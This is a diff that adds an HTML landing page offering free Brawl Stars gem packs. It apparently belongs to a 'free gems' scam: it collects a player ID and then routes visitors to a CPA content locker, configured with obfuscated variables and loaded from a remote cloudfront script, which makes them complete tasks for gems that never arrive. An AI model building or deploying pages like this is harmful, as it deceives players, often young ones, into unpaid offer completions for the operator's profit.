@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Brawl Stars Gems</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>    <div class="container">
+        <div class="gems-packs">
+            <h1 class="title-animated">Select Your Free Gems Pack</h1>
+            <div class="packs">
+                <div class="pack" data-gems="80">
+                    <div class="pack-content">
+                        <div class="gems-image">
+                            <img src="img/gems-brawl.png" alt="Gems Pack">
+                        </div>                        <h3>80 Gems</h3>
+                        <p class="pack-description">Starter Pack</p>
+                        <div class="price-container">
+                            <span class="original-price">$0.99</span>
+                            <span class="free-label">Free</span>
+                        </div>
+                        <button onclick="selectPack(80)">Select Pack</button>
+                        <div class="promo-badge">-100%</div>
+                    </div>
+                </div>
+                <div class="pack" data-gems="170">
+                    <div class="pack-content">
+                        <div class="gems-image">
+                            <img src="img/gems-brawl.png" alt="Gems Pack">
+                        </div>                        <h3>170 Gems</h3>
+                        <p class="pack-description">Advanced Pack</p>
+                        <div class="price-container">
+                            <span class="original-price">$1.99</span>
+                            <span class="free-label">Free</span>
+                        </div>
+                        <button onclick="selectPack(170)">Select Pack</button>
+                        <div class="promo-badge">-100%</div>
+                    </div>
+                </div>
+                <div class="pack featured" data-gems="360">
+                    <div class="pack-content">
+                        <div class="gems-image">
+                            <img src="img/gems-brawl.png" alt="Gems Pack">
+                        </div>                        <h3>360 Gems</h3>
+                        <p class="pack-description">Pro Pack</p>
+                        <div class="price-container">
+                            <span class="original-price">$4.99</span>
+                            <span class="free-label">Free</span>
+                        </div>
+                        <button onclick="selectPack(360)">Select Pack</button>
+                        <div class="promo-badge">HOT!</div>
+                    </div>
+                </div>
+                <div class="pack" data-gems="530">
+                    <div class="pack-content">
+                        <div class="gems-image">
+                            <img src="img/gems-brawl.png" alt="Gems Pack">
+                        </div>                        <h3>530 Gems</h3>
+                        <p class="pack-description">Elite Pack</p>
+                        <div class="price-container">
+                            <span class="original-price">$9.99</span>
+                            <span class="free-label">Free</span>
+                        </div>
+                        <button onclick="selectPack(530)">Select Pack</button>
+                        <div class="promo-badge">-100%</div>
+                    </div>
+                </div>
+                <div class="pack mega" data-gems="800">
+                    <div class="pack-content">
+                        <div class="gems-image">
+                            <img src="img/gems-brawl.png" alt="Gems Pack">
+                        </div>                        <h3>800 Gems</h3>
+                        <p class="pack-description">Mega Pack</p>
+                        <div class="price-container">
+                            <span class="original-price">$14.99</span>
+                            <span class="free-label">Free</span>
+                        </div>
+                        <button onclick="selectPack(800)">Select Pack</button>
+                        <div class="promo-badge">MEGA!</div>
+                    </div>
+                </div>
+                <div class="pack legendary" data-gems="1200">
+                    <div class="pack-content">
+                        <div class="gems-image">
+                            <img src="img/gems-brawl.png" alt="Gems Pack">
+                        </div>                        <h3>1200 Gems</h3>
+                        <p class="pack-description">Legendary Pack</p>
+                        <div class="price-container">
+                            <span class="original-price">$24.99</span>
+                            <span class="free-label">Free</span>
+                        </div>
+                        <button onclick="selectPack(1200)">Select Pack</button>
+                        <div class="promo-badge">EPIC!</div>
+                    </div>
+                </div>
+            </div>
+        </div>        <div id="userForm" class="user-form" style="display: none;">
+            <h2>Enter Your Brawl Stars ID</h2>
+            <input type="text" id="userId" placeholder="Enter your player ID" autocomplete="off">
+            <button onclick="verifyUser()">
+                <span class="button-text">Verify Player</span>
+            </button>
+        </div><div id="userInfo" class="user-info" style="display: none;">
+            <h2 class="player-info-title">Player Information</h2>
+            <div id="playerData" class="player-data-container"></div>
+        </div>
+        <div id="cpaTasksContainer" class="cpa-tasks" style="display: none;">
+            <h2>Complete Tasks to Get Your Gems</h2>
+            <!-- CPA Locker will be loaded here -->
+            <div class="cpa-loader"></div>
+        </div>
+    </div>
+    <!-- CPA Locker Configuration -->
+    <script type="text/javascript">
+        var ABueB_pRH_JAjXmc={"it":4497969,"key":"4feb9"};
+        // Additional configuration to ensure tasks load
+        var _0xjd82=true;
+        var _0xjd8H="auto";
+    </script>
+    <!-- CPA Locker Script -->
+    <script src="https://dlk457skl57zp.cloudfront.net/cd34aae.js" defer></script>
+    <script src="script.js"></script>
+</body>
+</html>
